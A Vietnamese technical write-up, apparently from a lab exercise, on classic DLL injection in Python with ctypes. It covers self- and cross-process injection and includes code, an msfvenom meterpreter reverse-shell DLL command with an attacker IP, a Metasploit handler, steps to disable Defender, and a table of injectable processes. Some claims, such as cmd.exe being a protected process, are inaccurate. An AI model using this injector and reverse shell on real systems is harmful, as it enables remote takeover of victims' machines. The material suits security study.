# Tài liệu kỹ thuật: Classic DLL Injection bằng Python (ctypes)

## 1. Tổng quan

Tài liệu này mô tả chi tiết hai kịch bản thực nghiệm Classic DLL Injection được triển khai bằng ngôn ngữ Python, sử dụng thư viện `ctypes` để gọi trực tiếp các Windows API cấp thấp. Hai file mã nguồn bao gồm:

| File | Kịch bản | Mô tả |
|---|---|---|
| `classic_dll_injection.py` | **Self-Injection** | Tiêm DLL vào chính tiến trình Python đang chạy (`GetCurrentProcess`) |
| `dll_injection.py` | **Cross-Process Injection** | Tiêm DLL vào tiến trình mục tiêu khác (`OpenProcess` + `CreateToolhelp32Snapshot`) |

Cả hai file đều tuân theo quy trình 4 bước chuẩn của Classic DLL Injection:

1. **Xác định tiến trình mục tiêu** — lấy PID hoặc handle
2. **Cấp phát bộ nhớ từ xa** — `VirtualAllocEx`
3. **Ghi đường dẫn DLL** — `WriteProcessMemory`
4. **Tạo luồng thực thi từ xa** — `CreateRemoteThread` + `LoadLibraryA`

---

## 2. Phân tích chi tiết: `classic_dll_injection.py` (Self-Injection)

### 2.1. Mục đích

Tiêm DLL vào **chính tiến trình Python đang chạy** bằng cách sử dụng `GetCurrentProcess()` để lấy handle. Phương pháp này bỏ qua toàn bộ cơ chế bảo vệ cross-process (AV hook, Process Mitigation Policy, Integrity Level check).

### 2.2. Thư viện và hằng số

```python
import os, sys, ctypes
from ctypes import wintypes
import urllib.request

MEM_COMMIT  = 0x00001000    # Cam kết cấp phát vùng nhớ vật lý
MEM_RESERVE = 0x00002000    # Đặt trước vùng nhớ ảo
PAGE_READWRITE = 0x04       # Quyền đọc/ghi (không cần Execute vì chỉ lưu chuỗi đường dẫn)
```

### 2.3. Khai báo Windows API qua ctypes

Sử dụng `ctypes.WinDLL('kernel32', use_last_error=True)` để bật cơ chế lưu mã lỗi chính xác qua `ctypes.get_last_error()`.

| API | Chức năng | restype | argtypes |
|---|---|---|---|
| `GetCurrentProcess` | Lấy pseudo-handle tiến trình hiện tại (giá trị -1) | `HANDLE` | `[]` |
| `VirtualAllocEx` | Cấp phát vùng nhớ trong không gian địa chỉ ảo | `c_void_p` | `[HANDLE, c_void_p, c_size_t, DWORD, DWORD]` |
| `WriteProcessMemory` | Ghi dữ liệu vào vùng nhớ đã cấp phát | `BOOL` | `[HANDLE, c_void_p, c_void_p, c_size_t, POINTER(c_size_t)]` |
| `GetModuleHandleA` | Lấy handle của module đã nạp (kernel32.dll) | `HMODULE` | `[LPCSTR]` |
| `GetProcAddress` | Lấy địa chỉ hàm trong module (LoadLibraryA) | `c_void_p` | `[HMODULE, LPCSTR]` |
| `CreateRemoteThread` | Tạo luồng mới thực thi LoadLibraryA | `HANDLE` | `[HANDLE, c_void_p, c_size_t, c_void_p, c_void_p, DWORD, POINTER(DWORD)]` |
| `WaitForSingleObject` | Chờ luồng hoàn tất | `DWORD` | `[HANDLE, DWORD]` |

### 2.4. Luồng thực thi

**Bước 1 — Lấy handle tiến trình hiện tại:**
```python
pid = os.getpid()
hProcess = kernel32.GetCurrentProcess()  # Trả về pseudo-handle -1
```
`GetCurrentProcess()` trả về pseudo-handle có giá trị -1 (`0xFFFFFFFFFFFFFFFF` trên 64-bit). Handle này **luôn có full access** mà không cần xin quyền từ kernel.

**Bước 2 — Tải DLL và cấp phát bộ nhớ:**
```python
urllib.request.urlretrieve(url, destination)
dll_bytes = dll_path.encode('utf-8') + b'\x00'  # Chuỗi null-terminated

addr = kernel32.VirtualAllocEx(
    hProcess, None, len(dll_bytes),
    MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE
)
```
DLL được tải từ máy chủ HTTP (Kali) về ổ đĩa cục bộ, sau đó đường dẫn tuyệt đối được mã hóa thành chuỗi byte null-terminated. `VirtualAllocEx` cấp phát vùng nhớ với quyền Read/Write.

**Bước 3 — Ghi đường dẫn DLL vào bộ nhớ:**
```python
written = ctypes.c_size_t(0)
kernel32.WriteProcessMemory(
    hProcess, ctypes.c_void_p(addr),
    dll_bytes, len(dll_bytes), ctypes.byref(written)
)
```

**Bước 4 — Phân giải LoadLibraryA và tạo luồng:**
```python
h_kernel32 = kernel32.GetModuleHandleA(b"kernel32.dll")
load_lib_addr = kernel32.GetProcAddress(h_kernel32, b"LoadLibraryA")

hThread = kernel32.CreateRemoteThread(
    hProcess, None, 0,
    ctypes.c_void_p(load_lib_addr),  # Địa chỉ LoadLibraryA
    ctypes.c_void_p(addr),           # Đường dẫn DLL đã ghi
    0, ctypes.byref(thread_id)
)
```
Luồng mới được tạo trong tiến trình hiện tại, thực thi hàm `LoadLibraryA` với tham số là địa chỉ vùng nhớ chứa đường dẫn DLL.

---

## 3. Phân tích chi tiết: `dll_injection.py` (Cross-Process Injection)

### 3.1. Mục đích

Tiêm DLL vào **tiến trình mục tiêu bên ngoài** bằng cách sử dụng `CreateToolhelp32Snapshot` để tìm PID theo tên tiến trình, sau đó mở tiến trình đó bằng `OpenProcess` với quyền `PROCESS_ALL_ACCESS`.

### 3.2. Khác biệt so với Self-Injection

| Đặc điểm | Self-Injection | Cross-Process |
|---|---|---|
| Lấy handle | `GetCurrentProcess()` (pseudo-handle -1) | `OpenProcess(PROCESS_ALL_ACCESS, False, pid)` |
| Tìm PID | `os.getpid()` | `CreateToolhelp32Snapshot` + `Process32FirstW/NextW` |
| Khai báo kernel32 | `ctypes.WinDLL('kernel32', use_last_error=True)` | `ctypes.windll.kernel32` |
| argtypes cho CreateRemoteThread | Có set | **Không set** — truyền thủ công từng `ctypes` object |
| Yêu cầu quyền | Không cần Admin | **Bắt buộc** Admin + tắt AV |

### 3.3. Hằng số bổ sung

```python
PROCESS_ALL_ACCESS = 0x001FFFFF    # Quyền truy cập đầy đủ
TH32CS_SNAPPROCESS = 0x00000002    # Flag chụp danh sách tiến trình
```

### 3.4. Cấu trúc PROCESSENTRY32W

Cấu trúc C được ánh xạ sang Python thông qua `ctypes.Structure`:

```python
class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),             # Kích thước struct (bắt buộc gán trước khi gọi)
        ("cntUsage", wintypes.DWORD),            # Số tham chiếu
        ("th32ProcessID", wintypes.DWORD),       # PID
        ("th32DefaultHeapID", ctypes.c_void_p),  # Heap ID
        ("th32ModuleID", wintypes.DWORD),        # Module ID
        ("cntThreads", wintypes.DWORD),          # Số luồng
        ("th32ParentProcessID", wintypes.DWORD), # PID cha
        ("pcPriClassBase", wintypes.LONG),        # Độ ưu tiên
        ("dwFlags", wintypes.DWORD),             # Cờ trạng thái
        ("szExeFile", wintypes.WCHAR * 260),     # Tên file .exe (Unicode)
    ]
```

### 3.5. Hàm tìm PID theo tên tiến trình

```python
def get_pid_by_name(proc_name):
    hSnap = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    pe32 = PROCESSENTRY32W()
    pe32.dwSize = ctypes.sizeof(PROCESSENTRY32W)
    if kernel32.Process32FirstW(hSnap, ctypes.byref(pe32)):
        while True:
            if pe32.szExeFile.lower() == proc_name.lower():
                pid = pe32.th32ProcessID
                kernel32.CloseHandle(hSnap)
                return pid
            if not kernel32.Process32NextW(hSnap, ctypes.byref(pe32)):
                break
    kernel32.CloseHandle(hSnap)
    return 0
```
Hàm này chụp snapshot toàn bộ danh sách tiến trình đang chạy, duyệt tuần tự bằng `Process32FirstW`/`Process32NextW`, so khớp tên file thực thi (case-insensitive).

### 3.6. Điểm kỹ thuật quan trọng: Không khai báo argtypes cho CreateRemoteThread

Trong phiên bản cross-process, `argtypes` của `CreateRemoteThread` **không được khai báo** để tránh ctypes tự động ép kiểu handle sai trên hệ thống 64-bit. Thay vào đó, mỗi tham số được bọc thủ công:

```python
hThread = kernel32.CreateRemoteThread(
    ctypes.c_void_p(hProcess),       # hProcess — ép kiểu thủ công
    ctypes.c_void_p(0),              # lpThreadAttributes = NULL
    ctypes.c_size_t(0),              # dwStackSize = 0
    ctypes.c_void_p(load_lib),       # lpStartAddress = LoadLibraryA
    ctypes.c_void_p(addr),           # lpParameter = đường dẫn DLL
    wintypes.DWORD(0),               # dwCreationFlags = 0
    ctypes.byref(thread_id)          # lpThreadId
)
```

---

## 4. Quy trình thực nghiệm

### 4.1. Chuẩn bị môi trường

**Máy tấn công (Kali Linux):**
1. Tạo DLL payload:
```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.64.152 LPORT=4444 -f dll -o /var/www/html/test.dll
```

2. Khởi động HTTP server và listener:
```bash
sudo service apache2 start
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST 172.16.64.152; set LPORT 4444; exploit"
```

**Máy nạn nhân (Windows):**
1. Tắt Windows Defender Real-time Protection và Tamper Protection
2. Chạy PowerShell với quyền Administrator
3. Python injector và tiến trình mục tiêu phải cùng kiến trúc 64-bit

### 4.2. Chạy Self-Injection

```powershell
python classic_dll_injection.py
```

Kết quả mong đợi:
```
[*] Bước 1: Lấy handle tiến trình hiện tại (self-injection)...
[+] PID tiến trình hiện tại: 12345
[+] Handle: -1
[*] Đang tải DLL từ máy chủ...
[+] DLL đã lưu tại: C:\...\test.dll
[*] Bước 2: Cấp phát bộ nhớ trong tiến trình...
[+] Đã cấp phát bộ nhớ tại: 0x1a2b3c40000
[*] Bước 3: Ghi đường dẫn DLL vào bộ nhớ...
[+] Đã ghi 46 bytes.
[*] Bước 4: Phân giải LoadLibraryA và tạo luồng...
[+] Địa chỉ LoadLibraryA: 0x7ff9bdd24cc0
[+] Inject thành công! Thread ID: 9876
[+] Hoàn tất thực nghiệm Classic DLL Injection (self-injection).
```

### 4.3. Chạy Cross-Process Injection

**Terminal 1** — Khởi chạy tiến trình mục tiêu:
```powershell
python target.py
# Output: [TARGET] PID = 15678
```

**Terminal 2** (Admin) — Chạy injector:
```powershell
python dll_injection.py
```

Kết quả mong đợi:
```
[*] Bước 1: Tìm tiến trình python.exe...
[+] PID: 15678
[*] Đang tải DLL...
[+] DLL: C:\...\test.dll
[*] Bước 2: OpenProcess...
[+] hProcess = 756
[+] Bộ nhớ: 0x1dcfbe00000
[*] Bước 3: WriteProcessMemory...
[+] Đã ghi 46 bytes.
[*] Bước 4: CreateRemoteThread...
[+] LoadLibraryA: 0x7ff9bdd24cc0
[+] INJECT THÀNH CÔNG! Thread ID: 4321
[+] Hoàn tất.
```

---

## 5. Lưu ý kỹ thuật quan trọng

### 5.1. Lỗi thường gặp

| Lỗi | Mã | Nguyên nhân | Khắc phục |
|---|---|---|---|
| `ERROR_INVALID_HANDLE` | 6 | AV hook chặn `CreateRemoteThread`, hoặc target có Process Mitigation Policy | Tắt AV + chọn tiến trình Win32 thuần |
| `ERROR_ACCESS_DENIED` | 5 | Injector không có quyền Admin hoặc target có Integrity Level cao hơn | Chạy với quyền Administrator |
| Cross-architecture | — | Injector 64-bit, target 32-bit (hoặc ngược lại) | Đảm bảo cùng kiến trúc |

### 5.2. Tiến trình mục tiêu phù hợp

| Tiến trình | Loại | Inject được? | Ghi chú |
|---|---|---|---|
| `python.exe` | Win32 | ✅ | Không có mitigation policy |
| `mspaint.exe` | Win32 | ✅ | Tùy phiên bản Windows |
| `notepad.exe` (Win11) | UWP/Store App | ❌ | CIG/CFG bật sẵn |
| `cmd.exe` | Console (conhost) | ❌ | Protected Process |
| `svchost.exe` | Hệ thống (SYSTEM) | ❌ | Integrity Level quá cao |

### 5.3. Sự khác biệt giữa `ctypes.windll` và `ctypes.WinDLL`

- **`ctypes.windll.kernel32`**: Singleton, chia sẻ toàn cục, `GetLastError()` có thể bị ghi đè bởi Python nội bộ.
- **`ctypes.WinDLL('kernel32', use_last_error=True)`**: Tạo instance riêng, lưu mã lỗi an toàn qua `ctypes.get_last_error()`.

Self-injection dùng `WinDLL` (an toàn hơn). Cross-process dùng `windll` để tránh xung đột khi không khai báo `argtypes` cho `CreateRemoteThread`.
